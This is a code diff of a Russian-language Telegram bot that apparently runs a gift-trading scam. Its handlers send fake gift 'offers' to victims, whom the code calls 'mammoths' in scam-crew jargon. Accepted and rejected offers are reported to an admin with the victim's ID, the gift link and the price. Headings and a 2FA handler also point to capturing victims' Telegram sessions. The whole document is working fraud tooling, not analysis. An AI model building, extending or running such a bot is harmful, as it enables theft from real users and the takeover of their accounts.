+                offer_lang,
+                "accepted_body",
+                price=o["price"],
+                currency=cur_label,
+                gift_name=o["gift_name"],
+                order=order,
+                worker_username=worker_uname
+            )
+            await edit_offer_message(call, o, accepted_text)
+
+            mammoth_uname = f"@{call.from_user.username.lstrip('@')}" if call.from_user.username else o.get("mammoth_username", "—")
+            await send_message_safe(
+                ADMIN_ID,
+                f"✅ <b>Оффер #{offer_id} ПРИНЯТ!</b>\n\n"
+                f"👤 Мамонт: <code>{call.from_user.id}</code> ({mammoth_uname})\n"
+                f"💼 Воркер: <code>{worker_id}</code> (@{worker_uname})\n"
+                f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
+                f"🔗 Ссылка: {o['gift_link']}\n"
+                f"💰 Сумма: <b>{o['price']} {cur_label}</b>\n"
+                f"📦 Заказ: <code>#{order}</code>\n"
+                f"🛠 Режим: <b>{o.get('delivery', '?')}</b>"
+            )
+        return
+
+    if data.startswith("reject:"):
+        _, _, raw_id = data.partition(":")
+        if not raw_id.isdigit():
+            return
+        offer_id = int(raw_id)
+        o = OFFERS.get(offer_id)
+        if not o:
+            await call.answer("Оффер не найден", show_alert=True)
+            return
+
+        offer_lang = o.get("lang", DEFAULT_LANG)
+        await call.answer(t(offer_lang, "alert_rejected"), show_alert=True)
+        rejected_text = t(offer_lang, "rejected_body")
+        await edit_offer_message(call, o, rejected_text)
+
+        mammoth_uname = f"@{call.from_user.username.lstrip('@')}" if call.from_user.username else o.get("mammoth_username", "—")
+        worker_uname = o.get("worker_username") or get_worker_username(o["worker_id"])
+        await send_message_safe(
+            ADMIN_ID,
+            f"❌ <b>Оффер #{offer_id} отклонён</b>\n\n"
+            f"👤 Мамонт: <code>{call.from_user.id}</code> ({mammoth_uname})\n"
+            f"💼 Воркер: <code>{o['worker_id']}</code> (@{worker_uname})\n"
+            f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
+            f"🔗 Ссылка: {o['gift_link']}\n"
+            f"🛠 Режим: <b>{o.get('delivery', '?')}</b>"
+        )
+        OFFERS.pop(offer_id, None)
+        save_data()
 
 # ═══════════════════════════════════════════════════════
 # 📱 АВТОРИЗАЦИЯ СЕССИИ ЧЕРЕЗ БОТА
@@ -972,266 +1258,6 @@ async def process_2fa(message: types.Message, state: FSMContext):
         await state.clear()
 
 # ═══════════════════════════════════════════════════════
-# 🔍 ИНЛАЙН
-# ═══════════════════════════════════════════════════════
-
-@dp.inline_query()
-async def inline_offer_handler(inline_query: InlineQuery):
-    query = inline_query.query.strip()
-    if not query.startswith("offer_"):
-        await inline_query.answer([], is_personal=True, cache_time=1)
-        return
-
-    try:
-        offer_id = int(query.split("_")[1])
-        o = OFFERS.get(offer_id)
-        if not o:
-            return
-
-        lang = o.get("lang", DEFAULT_LANG)
-        card_text = make_offer_card(o)
-        kb = make_offer_kb(offer_id, lang)
-
-        article = InlineQueryResultArticle(
-            id=str(offer_id),
-            title=f"Оффер #{offer_id}",
-            input_message_content=InputTextMessageContent(
-                message_text=card_text,
-                parse_mode="HTML"
-            ),
-            reply_markup=kb,
-            description=f"Отправить оффер на {o['gift_name']}"
-        )
-        await inline_query.answer([article], is_personal=True, cache_time=1)
-    except Exception as e:
-        print(f"[INLINE] Error: {e}", flush=True)
-
-@dp.chosen_inline_result()
-async def on_chosen_inline_result(chosen: ChosenInlineResult):
-    if chosen.inline_message_id and chosen.result_id:
-        try:
-            offer_id = int(chosen.result_id)
-            o = OFFERS.get(offer_id)
-            if o:
-                card_text = make_offer_card(o)
-                kb = make_offer_kb(offer_id, o.get("lang", DEFAULT_LANG))
-                await bot.edit_message_text(
-                    inline_message_id=chosen.inline_message_id,
-                    text=card_text,
-                    parse_mode="HTML",
-                    reply_markup=kb
-                )
-        except Exception:
-            pass
-
-# ═══════════════════════════════════════════════════════
-# 🔘 ОБРАБОТКА КНОПОК
-# ═══════════════════════════════════════════════════════
-
-async def edit_offer_message(call: types.CallbackQuery, o: dict, new_text: str, keep_kb: bool = False, kb=None):
-    parse_mode = "HTML"
-    try:
-        if call.inline_message_id:
-            await bot.edit_message_text(
-                inline_message_id=call.inline_message_id,
-                text=new_text,
-                parse_mode=parse_mode,
-                reply_markup=kb if keep_kb else None,
-            )
-            return True
-        elif call.message:
-            await bot.edit_message_text(
-                chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                text=new_text,
-                parse_mode=parse_mode,
-                reply_markup=kb if keep_kb else None,
-            )
-            return True
-    except TelegramBadRequest as e:
-        err = str(e).lower()
-        if "custom" in err or "entity" in err or "emoji" in err:
-            clean_txt = clean_custom_emoji(new_text)
-            try:
-                if call.inline_message_id:
-                    await bot.edit_message_text(
-                        inline_message_id=call.inline_message_id,
-                        text=clean_txt,
-                        parse_mode=parse_mode,
-                        reply_markup=kb if keep_kb else None,
-                    )
-                elif call.message:
-                    await bot.edit_message_text(
-                        chat_id=call.message.chat.id,
-                        message_id=call.message.message_id,
-                        text=clean_txt,
-                        parse_mode=parse_mode,
-                        reply_markup=kb if keep_kb else None,
-                    )
-                return True
-            except Exception as e2:
-                print(f"[EDIT] fallback error: {e2}", flush=True)
-        else:
-            if "not found" in err:
-                return False
-            print(f"[EDIT] error: {e}", flush=True)
-    except Exception as e:
-        print(f"[EDIT] error: {e}", flush=True)
-    return False
-
-@dp.callback_query()
-async def universal_callback(call: types.CallbackQuery):
-    data = call.data or ""
-    uid = call.from_user.id
-    current_lang = get_lang(uid)
-
-    if data == "open:lang":
-        rows = [
-            [InlineKeyboardButton(text=f"{'✅ ' if code == current_lang else ''}{name}", callback_data=f"setlang:{code}")]
-            for code, name in LANGS.items()
-        ]
-        rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
-        await call.message.edit_text(t(current_lang, "choose_lang"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
-        return
-
-    if data == "open:currency":
-        curr = get_currency(uid)
-        rows = [
-            [InlineKeyboardButton(text=f"{'✅ ' if code == curr else ''}{get_currency_label(code, current_lang, plain=True)}", callback_data=f"setcurrency:{code}")]
-            for code in CURRENCIES.keys()
-        ]
-        rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
-        await call.message.edit_text(t(current_lang, "choose_currency"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
-        return
-
-    if data == "open:main":
-        text = t(
-            current_lang, "start_msg",
-            uid=uid,
-            worker_username=get_worker_username(uid),
-            lang=LANGS.get(current_lang, current_lang),
-            currency=get_currency_label(get_currency(uid), current_lang),
-            session_status=session_status(uid),
-            business_status=business_status(uid),
-        )
-        await call.message.edit_text(text, reply_markup=make_worker_main_kb(uid))
-        return
-
-    if data.startswith("setlang:"):
-        new_lang = data.split(":")[1]
-        if new_lang in LANGS:
-            WORKER_LANGS[uid] = new_lang
-            save_data()
-            await call.answer(t(new_lang, "lang_set", lang=LANGS[new_lang]))
-            rows = [
-                [InlineKeyboardButton(text=f"{'✅ ' if code == new_lang else ''}{name}", callback_data=f"setlang:{code}")]
-                for code, name in LANGS.items()
-            ]
-            rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
-            try:
-                await call.message.edit_text(t(new_lang, "choose_lang"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
-            except Exception:
-                pass
-        return
-
-    if data.startswith("setcurrency:"):
-        new_cur = data.split(":")[1]
-        if new_cur in CURRENCIES:
-            WORKER_CURRENCIES[uid] = new_cur
-            save_data()
-            label_plain = get_currency_label(new_cur, current_lang, plain=True)
-            await call.answer(t(current_lang, "currency_set", currency=label_plain))
-            rows = [
-                [InlineKeyboardButton(text=f"{'✅ ' if code == new_cur else ''}{get_currency_label(code, current_lang, plain=True)}", callback_data=f"setcurrency:{code}")]
-                for code in CURRENCIES.keys()
-            ]
-            rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
-            try:
-                await call.message.edit_text(t(current_lang, "choose_currency"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
-            except Exception:
-                pass
-        return
-
-    if data.startswith("accept:"):
-        _, _, raw_id = data.partition(":")
-        if not raw_id.isdigit():
-            return
-        offer_id = int(raw_id)
-        o = OFFERS.get(offer_id)
-        if not o:
-            await call.answer("Оффер не найден или истёк", show_alert=True)
-            return
-
-        offer_lang = o.get("lang", DEFAULT_LANG)
-        worker_id = o["worker_id"]
-        worker_uname = o.get("worker_username") or get_worker_username(worker_id)
-        cur_label = get_currency_label(o.get("currency", DEFAULT_CURRENCY), offer_lang)
-
-        alert_text = t(offer_lang, "alert_accepted", gift_name=o["gift_name"], worker_username=worker_uname)
-        await call.answer(alert_text, show_alert=True)
-
-        if o.get("status") == "pending":
-            o["status"] = "accepted"
-            o["accepted_at"] = datetime.now(timezone.utc)
-            order = o.get("order_code") or gen_order_code()
-            o["order_code"] = order
-            save_data()
-
-            accepted_text = t(
-                offer_lang,
-                "accepted_body",
-                price=o["price"],
-                currency=cur_label,
-                gift_name=o["gift_name"],
-                order=order,
-                worker_username=worker_uname
-            )
-            await edit_offer_message(call, o, accepted_text)
-
-            mammoth_uname = f"@{call.from_user.username.lstrip('@')}" if call.from_user.username else o.get("mammoth_username", "—")
-            await send_message_safe(
-                ADMIN_ID,
-                f"✅ <b>Оффер #{offer_id} ПРИНЯТ!</b>\n\n"
-                f"👤 Мамонт: <code>{call.from_user.id}</code> ({mammoth_uname})\n"
-                f"💼 Воркер: <code>{worker_id}</code> (@{worker_uname})\n"
-                f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
-                f"🔗 Ссылка: {o['gift_link']}\n"
-                f"💰 Сумма: <b>{o['price']} {cur_label}</b>\n"
-                f"📦 Заказ: <code>#{order}</code>\n"
-                f"🛠 Режим: <b>{o.get('delivery', '?')}</b>"
-            )
-        return
-
-    if data.startswith("reject:"):
-        _, _, raw_id = data.partition(":")
-        if not raw_id.isdigit():
-            return
-        offer_id = int(raw_id)
-        o = OFFERS.get(offer_id)
-        if not o:
-            await call.answer("Оффер не найден", show_alert=True)
-            return
-
-        offer_lang = o.get("lang", DEFAULT_LANG)
-        await call.answer(t(offer_lang, "alert_rejected"), show_alert=True)
-        rejected_text = t(offer_lang, "rejected_body")
-        await edit_offer_message(call, o, rejected_text)
-
-        mammoth_uname = f"@{call.from_user.username.lstrip('@')}" if call.from_user.username else o.get("mammoth_username", "—")
-        worker_uname = o.get("worker_username") or get_worker_username(o["worker_id"])
-        await send_message_safe(
-            ADMIN_ID,
-            f"❌ <b>Оффер #{offer_id} отклонён</b>\n\n"
-            f"👤 Мамонт: <code>{call.from_user.id}</code> ({mammoth_uname})\n"
-            f"💼 Воркер: <code>{o['worker_id']}</code> (@{worker_uname})\n"
-            f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
-            f"🔗 Ссылка: {o['gift_link']}\n"
-            f"🛠 Режим: <b>{o.get('delivery', '?')}</b>"
-        )
-        OFFERS.pop(offer_id, None)
-        save_data()
-
-# ═══════════════════════════════════════════════════════
 # 📋 /START И КОМАНДЫ
 # ═══════════════════════════════════════════════════════
 
@@ -1246,7 +1272,7 @@ async def cmd_start(message: types.Message):
 
         lang = get_lang(uid)
         cur = get_currency(uid)
-        curr_label = get_currency_label(cur, lang)
+        curr_label = get_currency_label(cur, lang, plain=True)
 
         text = t(
             lang,
@@ -1269,7 +1295,7 @@ async def cmd_start(message: types.Message):
 
     if target_offer:
         offer_lang = target_offer.get("lang", DEFAULT_LANG)
-        cur_label = get_currency_label(target_offer.get("currency", DEFAULT_CURRENCY), offer_lang)
+        cur_label = get_currency_label(target_offer.get("currency", DEFAULT_CURRENCY), offer_lang, plain=True)
         worker_uname = target_offer.get("worker_username") or get_worker_username(target_offer["worker_id"])
 
         if not target_offer.get("order_code"):
@@ -1394,7 +1420,7 @@ async def cmd_workers(message: types.Message):
         uname = get_worker_username(wid)
         sess = "✅ Сессия" if wid in WORKER_SESSIONS else "❌ Сессия"
         biz = "✅ Бизнес" if WORKER_BUSINESS.get(wid, {}).get("enabled") else "❌ Бизнес"
-        lines.append(f"• <code>{wid}</code> (@{uname}) — {LANGS.get(lang, lang)} — {get_currency_label(cur, lang)} [{sess} | {biz}]")
+        lines.append(f"• <code>{wid}</code> (@{uname}) — {LANGS.get(lang, lang)} — {get_currency_label(cur, lang, plain=True)} [{sess} | {biz}]")
     await send_message_safe(message.chat.id, "\n".join(lines))
 
 @dp.message(Command("offers"))
@@ -1411,7 +1437,7 @@ async def cmd_offers(message: types.Message):
         minutes = int((now - created).total_seconds() // 60) if isinstance(created, datetime) else "?"
         wuname = o.get("worker_username") or get_worker_username(o["worker_id"])
         lines.append(
-            f"#{oid} [{o.get('status')}/{o.get('delivery', '?')}] — {o['gift_name']} — <b>{o['price']} {get_currency_label(o.get('currency'), o.get('lang'))}</b>\n"
+            f"#{oid} [{o.get('status')}/{o.get('delivery', '?')}] — {o['gift_name']} — <b>{o['price']} {get_currency_label(o.get('currency'), o.get('lang'), plain=True)}</b>\n"
             f"   Воркер: <code>{o['worker_id']}</code> (@{wuname})\n"
             f"   Мамонт: <code>{o['mammoth_id']}</code> | Возраст: {minutes} мин.\n"
             f"   Ссылка: {o.get('gift_link', '—')}"
